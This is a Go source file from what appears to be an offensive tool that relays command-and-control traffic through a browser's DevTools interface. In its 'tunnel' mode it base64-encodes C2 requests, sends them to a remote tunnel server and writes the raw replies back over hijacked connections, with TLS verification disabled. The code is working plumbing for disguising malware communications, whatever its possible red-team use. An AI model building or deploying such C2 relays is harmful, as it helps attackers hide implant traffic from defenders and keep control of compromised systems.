package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	"regexp"
	"strings"
)

func getURL(r *http.Request) string {
	host := r.Host
	pathWithQuery := r.URL.RequestURI()
	URL := fmt.Sprintf("%s%s", host, pathWithQuery)

	return URL
}

func HttpHandler(w http.ResponseWriter, r *http.Request) {
	/*
		     An HTTP request handler for initial C2 traffic that should get proxied.
		     in 'direct' mode, devToolsRequest is passed the request traffic as-is,
			 the browser will process and respond, and the result is sent back to the client.

			 in 'tunnel' mode, the request details are encoded in base64(JSON) and sent to
			 the remote tunnel server, which will unpack the JSON,make the request, and send back
			 a raw HTTP response which is written back to the requesting c2 client.

			 Args:
			   w: The HTTP response writer handle to write back to the calling process
			   r: The HTTP request reader handle, to get the details of the request
	*/
	requestURL := getURL(r)
	method := r.Method
	if Debug {
		log.Printf("HttpHandler: Received %s request for: %s\n", method, requestURL)
	}
	headers := ""
	scheme := "http://"
	for name, values := range r.Header {
		for _, value := range values {
			if strings.EqualFold(name, "scheme") {
				scheme = value
				break
			}
			headers = fmt.Sprintf("%s\n%s: %s", headers, name, value)
		}
	}
	/*
			  The scheme is defaulted to http:// if one isn't set from the 'scheme' header above.
		      In tunnel mode, if the c2 is on the same server as the tunnel, http:// is fine.
	*/
	if match, err := regexp.MatchString(`(?i)^https?://.*`, requestURL); !match || err != nil {
		requestURL = scheme + requestURL
	}
	if Debug {
		log.Printf("HttpHandler:Headers:%s", headers)
	}
	bodyBytes, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("HttpHandler:Failed to read body:%v\n", err)
		http.Error(w, "Failed to read body", http.StatusInternalServerError)
		return
	}
	defer r.Body.Close()
	bodyString := string(bodyBytes)
	if Debug {
		log.Printf("Body: %s\n", bodyString)
	}
	remoteAddr := r.RemoteAddr
	host, port, err := net.SplitHostPort(remoteAddr)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error parsing RemoteAddr: %v", err), http.StatusInternalServerError)
		return
	}
	if strings.EqualFold(Config.Mode, "tunnel") {
		requestURL, method, headers, bodyString = TunnelRequest(RequestData{URL: requestURL, Method: method, Headers: headers, Body: bodyString})

		devtoolsResponse := devToolsRequest(requestURL, method, headers, bodyString)
		var responseData ResponseData
		err = json.Unmarshal([]byte(devtoolsResponse), &responseData)
		if err != nil {
			log.Printf("HttpHandler: Error JSON decoding devtoolsResponse [%v]:%s", err, devtoolsResponse)
			http.Error(w, "Bad tunnel response, see logs for details.", http.StatusInternalServerError)
			return
		} else {
			decoded, err := base64.StdEncoding.DecodeString(responseData.Data)
			if err != nil {
				log.Printf("HttpHandler: Error base64 decoding devtoolsResponse [%v]:%s", err, devtoolsResponse)
				http.Error(w, "Bad tunnel response, see logs for details.", http.StatusInternalServerError)
				return
			}
			hj, ok := w.(http.Hijacker)
			if !ok {
				http.Error(w, "webserver doesn't support hijacking", http.StatusInternalServerError)
				return
			}
			conn, bufrw, err := hj.Hijack()
			if err != nil {
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}
			defer conn.Close()
			bufrw.Write(decoded)
			bufrw.Flush()
			if Debug {
				log.Printf("--- RAW RESPONSE START ---\n%s\n--- RAW RESPONSE END ---\n", devtoolsResponse)
			}
		}
	} else if strings.EqualFold(Config.Mode, "direct") {
		fmt.Fprintf(w, "%s", func() string {
			var _ string = fmt.Sprintf("%s:%s", host, port)
			return devToolsRequest(requestURL, method, headers, bodyString)
		}())
	} else {
		log.Fatalf("HttpHandler:Unsupported mode:%s\n", Config.Mode)
	}
}

func HttpRequest(reqData *RequestData) []byte {
	/*
		    Handles HTTP requests on behalf of clients.

			Args:
			  reqData: The structured request data which will be used for the request
			Returns:
			  A []byte of the raw HTTP response from the server
	*/
	var response []byte
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	if Debug {
		log.Printf("[+] %s - %s\n", reqData.Method, reqData.URL)
	}
	req, err := http.NewRequest(reqData.Method, reqData.URL, nil)
	if err != nil {
		log.Printf("HttpRequest: NewRequest error:%v\n", err)
		return response
	}
	for _, line := range strings.Split(reqData.Headers, "\n") {
		if strings.Contains(line, ":") {
			key := strings.Split(line, ":")[0]
			req.Header.Set(key, strings.Replace(line, key+":", "", 1))
		}
	}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("HttpRequest: error:%v\n", err)
		return response
	}
	response, err = httputil.DumpResponse(resp, true)
	if err != nil {
		log.Printf("HttpRequest:DumpResponse error:%v\n", err)
	}
	return response
}
func HttpServer() {
	/*
		    Handles HTTP requests

			Runs an HTTP server that proxies requests through a browser
			when in 'server' mode.

			Runs a TunnelHandler HTTP server when in 'tunnel' mode that
			handles tunneled traffic coming from browsers.
	*/
	if strings.EqualFold(Config.Mode, "server") {
		http.HandleFunc("/", TunnelHandler)
		log.Printf("HttpServer:Tunnel server (RemoteServer) starting on [%s]\n", Config.RemoteTunnel)
		if err := http.ListenAndServe(Config.RemoteTunnel, nil); err != nil {
			log.Fatal(err)
		}
	} else {
		http.HandleFunc("/", HttpHandler)

		log.Printf("HttpServer:HTTP server starting on [%s]\n", Config.HttpServer)
		if err := http.ListenAndServe(Config.HttpServer, nil); err != nil {
			log.Fatal(err)
		}
	}
}
